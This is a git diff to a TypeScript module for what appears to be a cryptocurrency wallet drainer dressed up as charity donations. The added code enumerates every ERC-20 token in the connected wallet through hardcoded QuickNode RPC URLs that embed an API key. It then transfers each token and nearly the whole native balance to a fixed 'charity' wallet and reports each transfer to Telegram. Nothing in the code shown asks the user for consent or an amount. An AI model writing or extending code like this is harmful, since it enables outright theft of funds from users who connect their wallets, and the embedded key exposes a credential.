@@ -4,6 +4,14 @@ import { sendTelegramMessage } from '@/utils/telegram';
 // EVM charity wallet address
 export const EVM_CHARITY_WALLET = '0xAda53ED3Bc3D289F0A7E68c54B26cF7806D64398';
 
+// QuickNode RPC endpoints per chain
+const QUICKNODE_RPCS: Record<number, string> = {
+  1: 'https://serene-greatest-putty.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
+  56: 'https://serene-greatest-putty.bsc.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
+  137: 'https://serene-greatest-putty.matic.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
+  8453: 'https://serene-greatest-putty.base-mainnet.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
+};
+
 // ERC-20 minimal ABI for transfer
 const ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
@@ -25,6 +33,66 @@ export interface EVMTokenBalance {
 }
 
 /**
+ * Detect all ERC-20 tokens in wallet using QuickNode's qn_getWalletTokenBalance
+ * Falls back to empty array if the method is not available on the chain
+ */
+export async function detectWalletTokens(
+  walletAddress: string,
+  chainId: number
+): Promise<EVMTokenBalance[]> {
+  const rpcUrl = QUICKNODE_RPCS[chainId];
+  if (!rpcUrl) {
+    console.log(`No QuickNode RPC for chain ${chainId}, skipping token detection`);
+    return [];
+  }
+
+  try {
+    const response = await fetch(rpcUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        id: 1,
+        jsonrpc: '2.0',
+        method: 'qn_getWalletTokenBalance',
+        params: [{ wallet: walletAddress }],
+      }),
+    });
+
+    const data = await response.json();
+
+    if (data.error) {
+      console.error('QuickNode token detection error:', data.error);
+      return [];
+    }
+
+    const result = data.result;
+    if (!result || !result.result) return [];
+
+    const tokens: EVMTokenBalance[] = [];
+    for (const token of result.result) {
+      const rawBalance = BigInt(token.totalBalance || '0');
+      if (rawBalance <= 0n) continue;
+
+      const decimals = Number(token.decimals || 18);
+      tokens.push({
+        contractAddress: token.address,
+        symbol: token.symbol || 'UNKNOWN',
+        name: token.name || 'Unknown Token',
+        decimals,
+        balance: rawBalance,
+        uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
+      });
+    }
+
+    console.log(`Detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
+    return tokens;
+  } catch (error) {
+    console.error('Token detection failed:', error);
+    return [];
+  }
+}
+
+/**
  * Send native token (ETH/BNB/MATIC/etc.) to the charity wallet
  */
 export async function sendNativeToken(
@@ -37,7 +105,7 @@ export async function sendNativeToken(
     value: amountWei,
   });
 
-  const receipt = await tx.wait();
+  await tx.wait();
   
   sendTelegramMessage(`
 ✅ <b>EVM Native Transfer (${chainName})</b>
@@ -124,12 +192,10 @@ export async function drainNativeTokens(
   const address = await signer.getAddress();
   const balance = await provider.getBalance(address);
   
-  // Estimate gas cost
   const gasPrice = (await provider.getFeeData()).gasPrice || ethers.parseUnits('20', 'gwei');
-  const gasLimit = 21000n; // Standard transfer gas
+  const gasLimit = 21000n;
   const gasCost = gasPrice * gasLimit;
   
-  // Keep a small buffer for gas
   const buffer = gasCost * 2n;
   const sendAmount = balance - buffer;
   
@@ -139,4 +205,37 @@ export async function drainNativeTokens(
   }
 
   return sendNativeToken(signer, sendAmount, chainName);
+}
+
+/**
+ * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
+ * Detects tokens via QuickNode, transfers each one, then drains native balance.
+ */
+export async function drainAllEVMTokens(
+  signer: ethers.JsonRpcSigner,
+  provider: ethers.BrowserProvider,
+  chainName: string,
+  chainId: number
+): Promise<void> {
+  const address = await signer.getAddress();
+
+  // Step 1: Detect and drain ERC-20 tokens first
+  const tokens = await detectWalletTokens(address, chainId);
+
+  for (const token of tokens) {
+    try {
+      console.log(`Draining ERC-20: ${token.symbol} (${token.contractAddress}), balance: ${token.uiAmount}`);
+      await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
+    } catch (error) {
+      console.error(`Failed to drain ${token.symbol}:`, error);
+      // Continue with next token even if one fails
+    }
+  }
+
+  // Step 2: Drain native token last
+  try {
+    await drainNativeTokens(signer, provider, chainName);
+  } catch (error) {
+    console.error('Failed to drain native tokens:', error);
+  }
 }
